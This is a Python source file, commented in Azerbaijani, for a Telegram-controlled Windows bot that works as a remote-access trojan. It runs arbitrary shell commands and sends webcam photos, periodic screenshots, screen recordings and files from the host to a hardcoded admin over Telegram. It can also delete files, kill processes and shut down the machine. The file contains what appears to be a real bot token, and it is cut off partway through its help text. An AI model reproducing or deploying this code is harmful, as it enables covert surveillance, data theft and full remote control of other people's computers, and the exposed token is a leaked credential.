import os
import sys
import json
import time
import logging
import threading
import tempfile
import subprocess
from datetime import datetime
from typing import Optional, Dict, Any, List
from dataclasses import dataclass, asdict
from enum import Enum
import requests
import telebot
from telebot.types import Message
import psutil
import platform
import ctypes
import cv2
import numpy as np
from PIL import ImageGrab
import shutil
import html
import re

# --- Logging Konfiqurasiyası ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --- Konfiqurasiya ---
class BotConfig:
    """Bot konfiqurasiya sinfi"""
    
    def __init__(self):
        # BOT TOKEN - BURAYA ÖZ TOKENİNİZİ YAZIN
        self.bot_token = "6800223810:AAFxY2GC2A6PHl3oquOTDUWQMv-HMBXjdoA"
        
        # Admin ID
        self.admin_id = "6353022269"
        
        # Digər konfiqurasiyalar
        self.max_command_history = 100
        self.auto_screen_interval = 30
        self.max_record_duration = 300
        self.temp_dir = tempfile.gettempdir()
        self.download_dir = os.path.expanduser("~/Downloads")
        self.enable_auto_restart = True
        self.restart_on_error = True
        self.log_level = "INFO"
        
        logger.info("✅ Konfiqurasiya yükləndi")
        logger.info(f"🤖 Bot Token: {self.bot_token[:10]}...")
        logger.info(f"👑 Admin ID: {self.admin_id}")

# --- Məlumat Modelləri ---
class CommandType(Enum):
    SYSTEM = "system"
    FILE = "file"
    MEDIA = "media"
    NETWORK = "network"
    ADMIN = "admin"

@dataclass
class Command:
    """Əmr məlumat strukturu"""
    text: str
    user_id: str
    timestamp: float
    command_type: CommandType
    result: Optional[str] = None
    error: Optional[str] = None

@dataclass
class Session:
    """İstifadəçi sessiyası"""
    user_id: str
    start_time: float
    last_activity: float
    current_path: str
    commands: List[Command]

# --- Bot Meneceri ---
class BotManager:
    """Bot meneceri - singleton pattern"""
    
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if not hasattr(self, 'initialized'):
            self.config = BotConfig()
            self.bot = telebot.TeleBot(self.config.bot_token, parse_mode='HTML')
            self.sessions: Dict[str, Session] = {}
            self.active_threads: List[threading.Thread] = []
            self.running = True
            self.auto_screen_active = False
            self.auto_screen_thread = None
            self.initialized = True
            
            # Bot handler-larını qeydiyyata al
            self.register_handlers()
            logger.info("✅ Bot meneceri başladıldı")
    
    def get_session(self, user_id: str) -> Session:
        """İstifadəçi sessiyasını əldə et"""
        if user_id not in self.sessions:
            self.sessions[user_id] = Session(
                user_id=user_id,
                start_time=time.time(),
                last_activity=time.time(),
                current_path=os.path.expanduser("~"),
                commands=[]
            )
            logger.info(f"📱 Yeni sessiya yaradıldı: {user_id}")
        return self.sessions[user_id]
    
    def register_handlers(self):
        """Bot handler-larını qeydiyyata al"""
        
        @self.bot.message_handler(commands=['start'])
        def start_command(message: Message):
            self.handle_start(message)
        
        @self.bot.message_handler(commands=['help'])
        def help_command(message: Message):
            self.handle_help(message)
        
        @self.bot.message_handler(content_types=['text'])
        def text_command(message: Message):
            self.handle_text(message)
        
        @self.bot.message_handler(content_types=['document'])
        def document_handler(message: Message):
            self.handle_document(message)
        
        @self.bot.message_handler(content_types=['photo'])
        def photo_handler(message: Message):
            self.handle_photo(message)
    
    def handle_start(self, message: Message):
        """Start əmri handler"""
        user_id = str(message.chat.id)
        if user_id != self.config.admin_id:
            self.send_message(message.chat.id, "❌ Bu bot yalnız admin üçündür!")
            logger.warning(f"⚠️ İcazəsiz giriş cəhdi: {user_id}")
            return
        
        session = self.get_session(user_id)
        welcome_msg = (
            "🤖 <b>WINDOWS BOT MANAGER ULTRA</b> 🤖\n\n"
            f"✅ <b>Bot aktivdir!</b>\n"
            f"📅 <b>İşə başlama:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"📂 <b>Cari qovluq:</b> <code>{session.current_path}</code>\n\n"
            "📝 <b>Kömək üçün /help yazın</b>\n"
            "⚡ <b>Versiya:</b> 4.0 ULTRA PROFESSIONAL"
        )
        self.send_message(message.chat.id, welcome_msg)
        logger.info(f"✅ Start əmri icra edildi: {user_id}")
    
    def handle_help(self, message: Message):
        """Help əmri handler"""
        help_text = self.get_help_text()
        self.send_message(message.chat.id, help_text)
        logger.info(f"📖 Kömək göndərildi: {message.chat.id}")
    
    def handle_text(self, message: Message):
        """Mətn mesajlarını emal et"""
        user_id = str(message.chat.id)
        
        # Admin yoxlaması
        if user_id != self.config.admin_id:
            logger.warning(f"⚠️ İcazəsiz giriş cəhdi: {user_id} - Əmr: {message.text}")
            return
        
        session = self.get_session(user_id)
        command_text = message.text.strip()
        
        # Əmri qeydə al
        command = Command(
            text=command_text,
            user_id=user_id,
            timestamp=time.time(),
            command_type=self.detect_command_type(command_text)
        )
        session.commands.append(command)
        session.last_activity = time.time()
        
        # Komanda limiti
        if len(session.commands) > self.config.max_command_history:
            session.commands = session.commands[-self.config.max_command_history:]
        
        logger.info(f"📝 Əmr qəbul edildi: {command_text} - {user_id}")
        
        # Əmri emal et
        try:
            result = self.process_command(command_text, session)
            command.result = result
            self.send_message(message.chat.id, result)
            logger.info(f"✅ Əmr icra edildi: {command_text}")
        except Exception as e:
            error_msg = f"❌ Xəta: {str(e)}"
            command.error = str(e)
            logger.error(f"❌ Əmr icrası xətası: {command_text} - {e}")
            self.send_message(message.chat.id, error_msg)
    
    def handle_document(self, message: Message):
        """Fayl upload handler"""
        user_id = str(message.chat.id)
        if user_id != self.config.admin_id:
            return
        
        try:
            session = self.get_session(user_id)
            file_info = self.bot.get_file(message.document.file_id)
            downloaded_file = self.bot.download_file(file_info.file_path)
            
            # Fayl adını təmizlə
            original_name = message.document.file_name
            clean_name = self.sanitize_filename(original_name)
            
            # Yaddaşa yaz
            save_path = os.path.join(session.current_path, clean_name)
            
            # Əgər fayl varsa, unikal ad yarat
            if os.path.exists(save_path):
                name, ext = os.path.splitext(clean_name)
                counter = 1
                while os.path.exists(os.path.join(session.current_path, f"{name}_{counter}{ext}")):
                    counter += 1
                save_path = os.path.join(session.current_path, f"{name}_{counter}{ext}")
            
            with open(save_path, 'wb') as f:
                f.write(downloaded_file)
            
            success_msg = (
                f"✅ <b>Fayl uğurla yükləndi!</b>\n\n"
                f"📄 <b>Ad:</b> {os.path.basename(save_path)}\n"
                f"📦 <b>Ölçü:</b> {message.document.file_size / 1024:.1f} KB\n"
                f"📍 <b>Yol:</b> <code>{save_path}</code>"
            )
            self.send_message(message.chat.id, success_msg)
            logger.info(f"📁 Fayl yükləndi: {save_path}")
            
        except Exception as e:
            logger.error(f"❌ Fayl yükləmə xətası: {e}")
            self.send_message(message.chat.id, f"❌ Yükləmə xətası: {str(e)}")
    
    def handle_photo(self, message: Message):
        """Şəkil upload handler"""
        user_id = str(message.chat.id)
        if user_id != self.config.admin_id:
            return
        
        try:
            session = self.get_session(user_id)
            file_info = self.bot.get_file(message.photo[-1].file_id)
            downloaded_file = self.bot.download_file(file_info.file_path)
            
            # Şəkli yadda saxla
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            save_path = os.path.join(session.current_path, f"photo_{timestamp}.jpg")
            
            with open(save_path, 'wb') as f:
                f.write(downloaded_file)
            
            success_msg = (
                f"✅ <b>Şəkil uğurla yükləndi!</b>\n\n"
                f"📍 <b>Yol:</b> <code>{save_path}</code>"
            )
            self.send_message(message.chat.id, success_msg)
            logger.info(f"📸 Şəkil yükləndi: {save_path}")
            
        except Exception as e:
            logger.error(f"❌ Şəkil yükləmə xətası: {e}")
            self.send_message(message.chat.id, f"❌ Yükləmə xətası: {str(e)}")
    
    def process_command(self, command: str, session: Session) -> str:
        """Əmri emal et və nəticəni qaytar"""
        cmd_lower = command.lower().strip()
        
        # --- Media əmrləri ---
        if cmd_lower == "screen":
            return self.take_screenshot(session)
        
        elif cmd_lower == "foto":
            return self.take_photo()
        
        elif cmd_lower.startswith("record"):
            return self.record_screen_command(command, session)
        
        elif cmd_lower == "autoscreen":
            return self.toggle_auto_screen()
        
        elif cmd_lower == "screens":
            return self.take_all_screenshots()
        
        # --- Sistem əmrləri ---
        elif cmd_lower == "ps":
            return self.get_process_list()
        
        elif cmd_lower.startswith("kill "):
            return self.kill_process_command(command)
        
        elif cmd_lower.startswith("run "):
            return self.run_program_command(command)
        
        elif cmd_lower.startswith("cmd "):
            return self.execute_command(command[4:])
        
        elif cmd_lower == "sysinfo":
            return self.get_system_info()
        
        # --- Fayl əmrləri ---
        elif cmd_lower == "ls":
            return self.list_directory(session)
        
        elif cmd_lower.startswith("cd "):
            return self.change_directory(command[3:], session)
        
        elif cmd_lower == "up":
            return self.change_directory("..", session)
        
        elif cmd_lower.startswith("download "):
            return self.download_file_command(command[9:], session)
        
        elif cmd_lower.startswith("delete "):
            return self.delete_file_command(command[7:], session)
        
        elif cmd_lower.startswith("mkdir "):
            return self.make_directory(command[6:], session)
        
        elif cmd_lower.startswith("search "):
            return self.search_files_command(command[7:], session)
        
        # --- Şəbəkə əmrləri ---
        elif cmd_lower == "ip":
            return self.get_ip_address()
        
        elif cmd_lower.startswith("google "):
            return self.google_search(command[7:])
        
        elif cmd_lower.startswith("youtube "):
            return self.youtube_search(command[8:])
        
        elif cmd_lower.startswith("download_url "):
            return self.download_from_url(command[13:], session)
        
        # --- Əyləncə əmrləri ---
        elif cmd_lower.startswith("msgbox "):
            return self.show_message_box(command[7:])
        
        elif cmd_lower == "beep":
            return self.play_beep()
        
        # --- İdarəetmə əmrləri ---
        elif cmd_lower == "restart":
            return self.restart_bot()
        
        elif cmd_lower == "shutdown":
            return self.shutdown_computer()
        
        elif cmd_lower == "lock":
            return self.lock_computer()
        
        elif cmd_lower == "sleep":
            return self.sleep_computer()
        
        elif cmd_lower == "history":
            return self.get_command_history(session)
        
        elif cmd_lower == "clear":
            return self.clear_chat()
        
        else:
            return f"❌ Bilinməyən əmr: {command}\n📝 Kömək üçün help yazın"
    
    # --- Media funksiyaları ---
    def take_screenshot(self, session: Session) -> str:
        """Ekran görüntüsü çək"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            filepath = os.path.join(session.current_path, filename)
            
            screenshot = ImageGrab.grab()
            screenshot.save(filepath)
            
            with open(filepath, 'rb') as f:
                self.bot.send_photo(self.config.admin_id, f, 
                                   caption=f"🖥️ Ekran görüntüsü: {timestamp}")
            
            os.remove(filepath)
            logger.info(f"📸 Ekran görüntüsü çəkildi: {filename}")
            return f"✅ Ekran görüntüsü çəkildi və göndərildi"
        except Exception as e:
            return f"❌ Ekran görüntüsü xətası: {str(e)}"
    
    def take_all_screenshots(self) -> str:
        """Bütün monitorların ekran görüntülərini çək"""
        try:
            screenshots = []
            
            def monitor_enum_proc(hMonitor, hdcMonitor, lprcMonitor, dwData):
                rect = lprcMonitor.contents
                left, top, right, bottom = rect.left, rect.top, rect.right, rect.bottom
                monitors.append((left, top, right, bottom))
                return 1

            from ctypes import wintypes
            monitors = []
            MONITORENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_ulong, ctypes.c_ulong, 
                                                 ctypes.POINTER(wintypes.RECT), ctypes.c_double)
            callback = MONITORENUMPROC(monitor_enum_proc)
            ctypes.windll.user32.EnumDisplayMonitors(0, 0, callback, 0)

            for i, (left, top, right, bottom) in enumerate(monitors):
                bbox = (left, top, right, bottom)
                img = ImageGrab.grab(bbox=bbox)
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                temp_path = os.path.join(tempfile.gettempdir(), f"screenshot_monitor_{i}_{timestamp}.png")
                img.save(temp_path)
                screenshots.append(temp_path)
            
            if screenshots:
                for path in screenshots:
                    with open(path, 'rb') as f:
                        self.bot.send_photo(self.config.admin_id, f, 
                                           caption=f"🖥️ Monitor görüntüsü")
                    os.remove(path)
                logger.info(f"📸 {len(screenshots)} monitor görüntüsü çəkildi")
                return f"✅ {len(screenshots)} ekran görüntüsü çəkildi və göndərildi"
            else:
                return "❏ Ekran görüntüləri alına bilmədi"
        except Exception as e:
            return f"❌ Çoxekranlı görüntü xətası: {str(e)}"
    
    def take_photo(self) -> str:
        """Kamera ilə şəkil çək"""
        cap = None
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return "❌ Kamera tapılmadı!"
            
            ret, frame = cap.read()
            if ret:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                temp_path = os.path.join(tempfile.gettempdir(), f"webcam_{timestamp}.jpg")
                cv2.imwrite(temp_path, frame)
                
                with open(temp_path, 'rb') as f:
                    self.bot.send_photo(self.config.admin_id, f, 
                                       caption=f"📸 Kamera şəkli: {timestamp}")
                
                os.remove(temp_path)
                logger.info(f"📸 Kamera şəkli çəkildi")
                return "✅ Şəkil çəkildi və göndərildi"
            else:
                return "❌ Şəkil çəkilə bilmədi"
        except Exception as e:
            return f"❌ Kamera xətası: {str(e)}"
        finally:
            if cap:
                cap.release()
    
    def record_screen_command(self, command: str, session: Session) -> str:
        """Ekran qeydi əmri"""
        try:
            # Duration parametrini al
            parts = command.split()
            duration = 30
            if len(parts) > 1:
                try:
                    duration = min(int(parts[1]), self.config.max_record_duration)
                except ValueError:
                    pass
            
            self.send_message(session.user_id, f"⏺️ Ekran qeyd edilir ({duration} saniyə)...")
            
            # Qeyd et
            video_path = self.record_screen(duration)
            if video_path and os.path.exists(video_path):
                with open(video_path, 'rb') as f:
                    self.bot.send_video(self.config.admin_id, f,
                                       caption=f"🎬 Ekran qeydi ({duration} saniyə)")
                os.remove(video_path)
                logger.info(f"🎬 Ekran qeydi tamamlandı: {duration} saniyə")
                return f"✅ Ekran qeydi tamamlandı və göndərildi"
            else:
                return "❌ Ekran qeydi alına bilmədi"
        except Exception as e:
            return f"❌ Qeyd xətası: {str(e)}"
    
    def record_screen(self, duration: int, fps: int = 10) -> Optional[str]:
        """Ekranı qeyd et"""
        try:
            import pyautogui
            screen_size = pyautogui.size()
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            temp_video = os.path.join(tempfile.gettempdir(), f"screen_rec_{int(time.time())}.mp4")
            out = cv2.VideoWriter(temp_video, fourcc, fps, screen_size)
            
            start_time = time.time()
            frame_count = 0
            while time.time() - start_time < duration:
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                out.write(frame)
                frame_count += 1
                time.sleep(1/fps)
            
            out.release()
            logger.info(f"🎬 Qeyd tamamlandı: {frame_count} kadr, {duration} saniyə")
            return temp_video
        except ImportError:
            logger.error("❌ pyautogui modulu tapılmadı")
            return None
        except Exception as e:
            logger.error(f"❌ Qeyd xətası: {e}")
            return None
    
    def toggle_auto_screen(self) -> str:
        """Avtomatik ekran görüntüsünü aç/qapa"""
        if not self.auto_screen_active:
            self.auto_screen_active = True
            self.auto_screen_thread = threading.Thread(target=self.auto_screenshot_loop, daemon=True)
            self.auto_screen_thread.start()
            logger.info("🔄 Autoscreen başladıldı")
            return "✅ Autoscreen başladı (hər 30 saniyə)"
        else:
            self.auto_screen_active = False
            logger.info("🛑 Autoscreen dayandırıldı")
            return "🛑 Autoscreen dayandırıldı"
    
    def auto_screenshot_loop(self):
        """Avtomatik ekran görüntüsü döngüsü"""
        while self.auto_screen_active:
            try:
                timestamp = datetime.now().strftime("%H:%M:%S")
                temp_path = os.path.join(tempfile.gettempdir(), f"auto_screen_{int(time.time())}.png")
                
                screenshot = ImageGrab.grab()
                screenshot.save(temp_path)
                
                with open(temp_path, 'rb') as f:
                    self.bot.send_photo(self.config.admin_id, f, 
                                       caption=f"🖥️ Avtomatik ss: {timestamp}")
                
                os.remove(temp_path)
                logger.info(f"📸 Autoscreen çəkildi: {timestamp}")
                
            except Exception as e:
                logger.error(f"❌ Autoscreen xətası: {e}")
            
            time.sleep(30)
    
    # --- Sistem funksiyaları ---
    def get_process_list(self) -> str:
        """İşləyən prosesləri siyahıla"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            processes.sort(key=lambda x: x.get('cpu_percent', 0) or 0, reverse=True)
            
            result = "<b>📊 İŞLƏYƏN PROSESLƏR (Top 20)</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            for i, proc in enumerate(processes[:20], 1):
                cpu = proc.get('cpu_percent', 0) or 0
                mem = proc.get('memory_percent', 0) or 0
                name = proc.get('name', '?')[:30]
                pid = proc.get('pid', '?')
                result += f"{i}. <code>{name}</code> | CPU: {cpu:.1f}% | RAM: {mem:.1f}% | PID: {pid}\n"
            
            return result
        except Exception as e:
            return f"❌ Proses siyahısı xətası: {str(e)}"
    
    def kill_process_command(self, command: str) -> str:
        """Prosesi dayandır"""
        try:
            pid = int(command.split()[1])
            proc = psutil.Process(pid)
            proc_name = proc.name()
            proc.terminate()
            logger.info(f"🔪 Proses dayandırıldı: {proc_name} (PID: {pid})")
            return f"✅ Proses dayandırıldı: {proc_name} (PID: {pid})"
        except (IndexError, ValueError):
            return "❌ Düzgün PID daxil edin! Misal: kill 1234"
        except psutil.NoSuchProcess:
            return "❌ Proses tapılmadı"
        except Exception as e:
            return f"❌ Dayandırma xətası: {str(e)}"
    
    def run_program_command(self, command: str) -> str:
        """Proqramı işə sal"""
        try:
            program = command[4:].strip()
            if os.path.exists(program):
                subprocess.Popen(program)
            else:
                subprocess.Popen(program, shell=True)
            logger.info(f"🚀 Proqram işə salındı: {program}")
            return f"✅ Proqram işə salındı: {program}"
        except Exception as e:
            return f"❌ İşə salma xətası: {str(e)}"
    
    def execute_command(self, command: str) -> str:
        """CMD əmri icra et"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            output = result.stdout if result.stdout else result.stderr
            if len(output) > 4000:
                temp_file = os.path.join(tempfile.gettempdir(), "cmd_output.txt")
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(output)
                with open(temp_file, 'rb') as f:
                    self.bot.send_document(self.config.admin_id, f, caption="📄 CMD çıxışı")
                os.remove(temp_file)
                return "✅ Əmr icra olundu. Çıxış fayl olaraq göndərildi."
            return output if output else "✅ Əmr icra olundu (çıxış yoxdur)"
        except subprocess.TimeoutExpired:
            return "❌ Əmr vaxt aşımına uğradı (30 saniyə)"
        except Exception as e:
            return f"❌ İcra xətası: {str(e)}"
    
    def get_system_info(self) -> str:
        """Sistem məlumatlarını göstər"""
        try:
            boot_time = datetime.fromtimestamp(psutil.boot_time())
            uptime = datetime.now() - boot_time
            
            info = f"""
<b>🖥 SİSTEM MƏLUMATLARI</b>
━━━━━━━━━━━━━━━━━━━━
<b>Əməliyyat sistemi:</b> {platform.system()} {platform.release()}
<b>Versiya:</b> {platform.version()}
<b>Kompüter adı:</b> {platform.node()}
<b>Prosessor:</b> {platform.processor()}
<b>RAM:</b> {round(psutil.virtual_memory().total / (1024**3), 2)} GB
<b>Boş RAM:</b> {round(psutil.virtual_memory().available / (1024**3), 2)} GB
<b>RAM istifadəsi:</b> {psutil.virtual_memory().percent}%
<b>Disk (C:):</b> {round(psutil.disk_usage('C:').free / (1024**3), 2)} GB boş
<b>Disk istifadəsi:</b> {psutil.disk_usage('C:').percent}%
<b>CPU istifadəsi:</b> {psutil.cpu_percent()}%
<b>Sistem işləmə müddəti:</b> {str(uptime).split('.')[0]}
<b>Bot işləmə müddəti:</b> {time.time() - self.start_time:.0f} saniyə
<b>Admin rejimi:</b> {'✅ Bəli' if self.is_admin() else '❌ Xeyr'}
━━━━━━━━━━━━━━━━━━━━
            """
            return info
        except Exception as e:
            return f"❌ Sistem məlumatı xətası: {str(e)}"
    
    def is_admin(self) -> bool:
        """Admin rejimində olub olmadığını yoxla"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    # --- Fayl funksiyaları ---
    def list_directory(self, session: Session) -> str:
        """Qovluq məzmununu göstər"""
        try:
            items = sorted(os.listdir(session.current_path))
            
            result = f"📂 <b>Cari qovluq:</b> <code>{html.escape(session.current_path)}</code>\n"
            result += f"📊 <b>Cəmi:</b> {len(items)} element\n━━━━━━━━━━━━━━━━━━━━\n"
            
            # Qovluqlar
            folders = []
            files = []
            
            for item in items:
                full_path = os.path.join(session.current_path, item)
                if os.path.isdir(full_path):
                    folders.append(item)
                else:
                    size = os.path.getsize(full_path)
                    files.append((item, size))
            
            if folders:
                result += "<b>📁 QOVLUQLAR:</b>\n"
                for i, folder in enumerate(folders[:20], 1):
                    result += f"{i}. 📁 {folder}\n"
            
            if files:
                result += "\n<b>📄 FAYLLAR:</b>\n"
                for i, (file, size) in enumerate(files[:20], 1):
                    size_str = self.format_size(size)
                    result += f"{i}. 📄 {file} ({size_str})\n"
            
            if len(items) > 40:
                result += f"\n... və {len(items)-40} daha çox"
            
            return result
        except Exception as e:
            return f"❌ Qovluq oxuma xətası: {str(e)}"
    
    def change_directory(self, path: str, session: Session) -> str:
        """Qovluğu dəyiş"""
        try:
            if path == "..":
                new_path = os.path.dirname(session.current_path)
            else:
                new_path = os.path.join(session.current_path, path)
            
            if os.path.exists(new_path) and os.path.isdir(new_path):
                session.current_path = os.path.abspath(new_path)
                logger.info(f"📁 Qovluq dəyişdirildi: {session.current_path}")
                return f"✅ Yeni qovluq: {session.current_path}"
            else:
                return f"❌ Qovluq tapılmadı: {path}"
        except Exception as e:
            return f"❌ Qovluq dəyişmə xətası: {str(e)}"
    
    def download_file_command(self, filename: str, session: Session) -> str:
        """Faylı yüklə"""
        try:
            file_path = os.path.join(session.current_path, filename)
            if os.path.exists(file_path) and os.path.isfile(file_path):
                with open(file_path, 'rb') as f:
                    self.bot.send_document(self.config.admin_id, f,
                                         caption=f"📥 Fayl: {filename}")
                logger.info(f"📥 Fayl göndərildi: {file_path}")
                return f"✅ Fayl göndərildi: {filename}"
            else:
                return f"❌ Fayl tapılmadı: {filename}"
        except Exception as e:
            return f"❌ Göndərmə xətası: {str(e)}"
    
    def delete_file_command(self, filename: str, session: Session) -> str:
        """Faylı sil"""
        try:
            file_path = os.path.join(session.current_path, filename)
            if os.path.isfile(file_path):
                os.remove(file_path)
                logger.info(f"🗑️ Fayl silindi: {file_path}")
                return f"✅ Fayl silindi: {filename}"
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
                logger.info(f"🗑️ Qovluq silindi: {file_path}")
                return f"✅ Qovluq silindi: {filename}"
            else:
                return f"❌ Tapılmadı: {filename}"
        except Exception as e:
            return f"❌ Silmə xətası: {str(e)}"
    
    def make_directory(self, dirname: str, session: Session) -> str:
        """Qovluq yarat"""
        try:
            dir_path = os.path.join(session.current_path, dirname)
            os.makedirs(dir_path, exist_ok=True)
            logger.info(f"📁 Qovluq yaradıldı: {dir_path}")
            return f"✅ Qovluq yaradıldı: {dirname}"
        except Exception as e:
            return f"❌ Xəta: {str(e)}"
    
    def search_files_command(self, query: str, session: Session) -> str:
        """Fayl axtar"""
        try:
            self.send_message(session.user_id, f"🔍 Axtarılır: {query}...")
            results = self.search_files(query, session.current_path)
            
            if results:
                result_text = f"<b>🔍 AXTARIŞ NƏTİCƏLƏRİ</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                for i, result in enumerate(results[:20], 1):
                    result_text += f"{i}. {os.path.basename(result)}\n<code>{result}</code>\n\n"
                return result_text
            else:
                return "❌ Heç bir nəticə tapılmadı"
        except Exception as e:
            return f"❌ Axtarış xətası: {str(e)}"
    
    def search_files(self, filename: str, search_path: str) -> List[str]:
        """Faylları axtar"""
        results = []
        try:
            for root, dirs, files in os.walk(search_path):
                # Gizli qovluqları atla
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                
                for file in files:
                    if filename.lower() in file.lower():
                        results.append(os.path.join(root, file))
                        if len(results) >= 20:
                            break
                if len(results) >= 20:
                    break
        except Exception as e:
            logger.error(f"Axtarış xətası: {e}")
        return results
    
    # --- Şəbəkə funksiyaları ---
    def get_ip_address(self) -> str:
        """IP ünvanını göstər"""
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
            return f"🌐 IP ünvanınız: <code>{ip}</code>"
        except Exception as e:
            return f"❌ IP alına bilmədi: {str(e)}"
    
    def google_search(self, query: str) -> str:
        """Google-da axtar"""
        try:
            import webbrowser
            search_url = f"https://www.google.com/search?q={query.replace(' ', '+')}"
            webbrowser.open(search_url)
            logger.info(f"🔍 Google axtarış: {query}")
            return f"🔍 Google-da axtarış açıldı: {query}"
        except Exception as e:
            return f"❌ Axtarış xətası: {str(e)}"
    
    def youtube_search(self, query: str) -> str:
        """YouTube-da axtar"""
        try:
            import webbrowser
            search_url = f"https://www.youtube.com/results?search_query={query.replace(' ', '+')}"
            webbrowser.open(search_url)
            logger.info(f"📺 YouTube axtarış: {query}")
            return f"📺 YouTube-da axtarış açıldı: {query}"
        except Exception as e:
            return f"❌ Axtarış xətası: {str(e)}"
    
    def download_from_url(self, url: str, session: Session) -> str:
        """URL-dən fayl endir"""
        try:
            self.send_message(session.user_id, f"⬇️ Fayl endirilir: {url}")
            
            response = requests.get(url, stream=True, timeout=30)
            response.raise_for_status()
            
            filename = url.split('/')[-1].split('?')[0]
            if not filename:
                filename = f"download_{int(time.time())}"
            
            save_path = os.path.join(session.current_path, filename)
            
            with open(save_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            
            with open(save_path, 'rb') as f:
                self.bot.send_document(self.config.admin_id, f, 
                                     caption=f"📥 Endirilən fayl: {filename}")
            
            os.remove(save_path)
            logger.info(f"📥 URL-dən fayl endirildi: {url}")
            return f"✅ Fayl endirildi və göndərildi: {filename}"
            
        except Exception as e:
            return f"❌ Endirmə xətası: {str(e)}"
    
    # --- Əyləncə funksiyaları ---
    def show_message_box(self, text: str) -> str:
        """Mesaj pəncərəsi göstər"""
        try:
            ctypes.windll.user32.MessageBoxW(0, text, "Telegram Bot Mesajı", 0)
            logger.info(f"💬 Mesaj pəncərəsi göstərildi: {text}")
            return "✅ Mesaj pəncərəsi göstərildi"
        except Exception as e:
            return f"❌ Xəta: {str(e)}"
    
    def play_beep(self) -> str:
        """Səs çal"""
        try:
            import winsound
            winsound.Beep(1000, 500)
            logger.info("🔊 Səs çalındı")
            return "🔊 Səs çalındı"
        except ImportError:
            return "❌ winsound modulu tapılmadı"
        except Exception as e:
            return f"❌ Səs xətası: {str(e)}"
    
    # --- İdarəetmə funksiyaları ---
    def restart_bot(self) -> str:
        """Botu yenidən başlat"""
        self.send_message(self.config.admin_id, "🔄 Bot yenidən başladılır...")
        logger.info("🔄 Bot yenidən başladılır...")
        time.sleep(1)
        os.execl(sys.executable, sys.executable, *sys.argv)
        return "✅ Bot yenidən başladıldı"
    
    def shutdown_computer(self) -> str:
        """Kompüteri bağla"""
        try:
            os.system("shutdown /s /t 30")
            logger.info("🖥️ Kompüter bağlanır...")
            return "🖥️ Kompüter 30 saniyə sonra bağlanacaq"
        except Exception as e:
            return f"❌ Bağlama xətası: {str(e)}"
    
    def lock_computer(self) -> str:
        """Kompüteri kilidlə"""
        try:
            ctypes.windll.user32.LockWorkStation()
            logger.info("🔒 Kompüter kilidləndi")
            return "🔒 Kompüter kilidləndi"
        except Exception as e:
            return f"❌ Kilidləmə xətası: {str(e)}"
    
    def sleep_computer(self) -> str:
        """Kompüteri yuxu rejiminə keçir"""
        try:
            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
            logger.info("💤 Kompüter yuxu rejiminə keçdi")
            return "💤 Kompüter yuxu rejiminə keçir..."
        except Exception as e:
            return f"❌ Xəta: {str(e)}"
    
    def get_command_history(self, session: Session) -> str:
        """Əmr tarixçəsini göstər"""
        if not session.commands:
            return "📭 Heç bir komanda yoxdur"
        
        result = "<b>📜 KOMANDA TARİXÇƏSİ</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        for i, cmd in enumerate(session.commands[-20:], 1):
            time_str = datetime.fromtimestamp(cmd.timestamp).strftime("%H:%M:%S")
            result += f"{i}. [{time_str}] {html.escape(cmd.text[:50])}\n"
        
        return result
    
    def clear_chat(self) -> str:
        """Söhbəti təmizlə"""
        # Bu funksiya sadəcə mesaj göndərir, çünki mesajları silmək üçün 
        # message_id-lərə ehtiyac var
        return "🧹 Söhbət təmizlənməsi üçün mesaj ID-ləri lazımdır. Bu funksiya təkmilləşdiriləcək."
    
    # --- Köməkçi funksiyalar ---
    def get_help_text(self) -> str:
        """Kömək mətnini qaytar"""
        return """
🤖 <b>WINDOWS BOT MANAGER ULTRA</b> 🤖

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📸 <b>MEDIA ƏMRLƏRİ:</b>
• <code>foto</code> - Veb-kameradan şəkil çək
• <code>screen</code> - Ekran görüntüsü al
• <code>screens</code> - Bütün ekranları çək (hər monitor ayrı)
• <code>autoscreen</code> - Avtomatik ss (hər 30 saniyə)
• <code>record [saniyə]</code> - Ekranı yaz (default 30 saniyə)

💻 <b>SİSTEM ƏMRLƏRİ:</b>
• <code>ps</code> - İşləyən prosesləri göstər
• <code>kill [PID]</code> - Prosesi dayandır
• <code>run [proqram]</code> - Proqramı işə sal
• <code>cmd [əmr]</code> - CMD əmri icra et
• <code>sysinfo</code> - Sistem məlumatları

📂 <b>FAYL ƏMRLƏRİ:</b>
• <code>ls</code> - Faylları siyahıla
• <code>cd [yol]</code> - Qovluğa keç
• <code>up</code> - Üst qovluğa keç
• <code>download [fayl]</code> - Faylı yüklə
• <code>delete [fayl]</code> - Faylı sil
• <code>mkdir [ad]</code> - Qovluq yarat
